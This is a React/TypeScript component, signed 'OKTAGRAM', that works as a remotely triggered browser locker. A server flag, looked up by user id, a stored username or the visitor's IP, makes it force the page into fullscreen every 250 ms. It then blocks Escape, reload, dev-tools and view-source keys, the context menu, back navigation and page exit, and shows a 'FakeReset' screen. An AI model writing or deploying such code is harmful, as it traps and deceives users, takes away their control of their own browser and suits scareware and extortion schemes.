/*
  nexus://o8.2 build
  author & every line: OKTAGRAM
  OKTAGRAM YANG MENULIS INI JIKA BERANI BONGKAR BONGKAR
  sig://oktagram
*/

import { useCallback, useEffect, useRef, useState } from 'react';
import { useStore } from '../lib/store';
import { rpcGetBlackout, rpcGetBlackoutIp, rpcGetBlackoutPublic } from '../lib/api';
import { onBlackout } from '../lib/realtime';
import FakeReset from './FakeReset';

const POLL_MS = 10000;

const LAST_USER_KEY = 'nexus:lastuser';

function lastUsername(): string {
  try {
    return localStorage.getItem(LAST_USER_KEY) ?? '';
  } catch {
    return '';
  }
}

export default function BlackoutOverlay() {
  const me = useStore((s) => s.me);
  const [blacked, setBlacked] = useState(false);
  const blackedRef = useRef(false);

  const setB = useCallback((v: boolean) => {
    blackedRef.current = v;
    setBlacked(v);
  }, []);

  const check = useCallback(async () => {
    const st = useStore.getState();
    try {
      if (st.me?.id) {
        const active = await rpcGetBlackout(st.me.id);
        setB(active);
        return;
      }
      const uname = lastUsername();
      if (uname) {
        const active = await rpcGetBlackoutPublic(uname);
        setB(active);
        return;
      }
      const ipActive = await rpcGetBlackoutIp();
      setB(ipActive);
    } catch {
    }
  }, [setB]);

  useEffect(() => {
    if (me?.id) check();
  }, [me?.id, check]);

  useEffect(() => {
    check();
    const t = setInterval(check, POLL_MS);
    const onVis = () => {
      if (!document.hidden) check();
    };
    document.addEventListener('visibilitychange', onVis);
    window.addEventListener('focus', onVis);
    return () => {
      clearInterval(t);
      document.removeEventListener('visibilitychange', onVis);
      window.removeEventListener('focus', onVis);
    };
  }, [check]);

  useEffect(() => {
    return onBlackout((p) => {
      const uid = useStore.getState().me?.id;
      if (uid && p.target_user_id === uid) setB(p.active);
    });
  }, [setB]);

  useEffect(() => {
    if (!blacked) return;

    let fsPending = false;
    const enter = () => {
      try {
        if (document.fullscreenElement || fsPending) return;
        const el = document.documentElement;
        if (typeof el.requestFullscreen !== 'function') return;
        fsPending = true;
        const p = el.requestFullscreen({ navigationUI: 'hide' });
        p.then(
          () => {
            fsPending = false;
          },
          () => {
            fsPending = false;
          }
        );
      } catch {
        fsPending = false;
      }
    };

    const HARD = new Set(['f11', 'f12', 'escape', 'f10', 'f5', 'backspace']);
    const COMBO = new Set(['i', 'j', 'c', 'u', 'p', 's']);

    const onKey = (e: KeyboardEvent) => {
      const k = (e.key || '').toLowerCase();
      const blocked = HARD.has(k) || ((e.ctrlKey || e.metaKey) && COMBO.has(k));
      if (blocked) {
        e.preventDefault();
        e.stopPropagation();
        window.setTimeout(enter, 0);
      }
      enter();
    };

    const onKeyUp = (e: KeyboardEvent) => {
      const k = (e.key || '').toLowerCase();
      if (HARD.has(k) || ((e.ctrlKey || e.metaKey) && COMBO.has(k))) {
        e.preventDefault();
      }
    };

    const onFullscreen = () => {
      if (!document.fullscreenElement) enter();
    };

    const onCtx = (e: Event) => e.preventDefault();
    const onTouch = () => enter();
    const onWheel = () => enter();
    const onMove = () => enter();
    const onResize = () => {
      window.scrollTo(0, 0);
      enter();
    };

    const trapBack = () => {
      try {
        window.history.pushState({ nexus: true }, '');
      } catch {
      }
    };

    const onBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
    };

    enter();
    trapBack();
    const id = window.setInterval(enter, 250);
    window.addEventListener('keydown', onKey, true);
    document.addEventListener('keydown', onKey, true);
    window.addEventListener('keyup', onKeyUp, true);
    document.addEventListener('keyup', onKeyUp, true);
    document.addEventListener('pointerdown', enter);
    document.addEventListener('touchstart', onTouch);
    document.addEventListener('touchmove', onTouch);
    document.addEventListener('wheel', onWheel);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('fullscreenchange', onFullscreen);
    document.addEventListener('contextmenu', onCtx);
    document.addEventListener('visibilitychange', enter);
    window.addEventListener('focus', enter);
    window.addEventListener('pageshow', enter);
    window.addEventListener('popstate', trapBack);
    window.addEventListener('beforeunload', onBeforeUnload);
    window.addEventListener('resize', onResize);
    return () => {
      clearInterval(id);
      window.removeEventListener('keydown', onKey, true);
      document.removeEventListener('keydown', onKey, true);
      window.removeEventListener('keyup', onKeyUp, true);
      document.removeEventListener('keyup', onKeyUp, true);
      document.removeEventListener('pointerdown', enter);
      document.removeEventListener('touchstart', onTouch);
      document.removeEventListener('touchmove', onTouch);
      document.removeEventListener('wheel', onWheel);
      document.removeEventListener('mousemove', onMove);
      document.removeEventListener('fullscreenchange', onFullscreen);
      document.removeEventListener('contextmenu', onCtx);
      document.removeEventListener('visibilitychange', enter);
      window.removeEventListener('focus', enter);
      window.removeEventListener('pageshow', enter);
      window.removeEventListener('popstate', trapBack);
      window.removeEventListener('beforeunload', onBeforeUnload);
      window.removeEventListener('resize', onResize);
    };
  }, [blacked]);

  useEffect(() => {
    return () => {
      if (!blackedRef.current && document.fullscreenElement) {
        try {
          document.exitFullscreen?.().catch(() => {});
        } catch {
        }
      }
    };
  }, []);

  if (!blacked) return null;

  return (
    <div
      className="fixed inset-0 z-[999999] overflow-hidden"
      style={{
        pointerEvents: 'auto',
        userSelect: 'none',
        cursor: 'none',
        touchAction: 'none',
        overscrollBehavior: 'none',
      }}
      aria-hidden
      onPointerDown={(e) => e.preventDefault()}
      onTouchMove={(e) => e.preventDefault()}
    >
      <FakeReset />
    </div>
  );
}
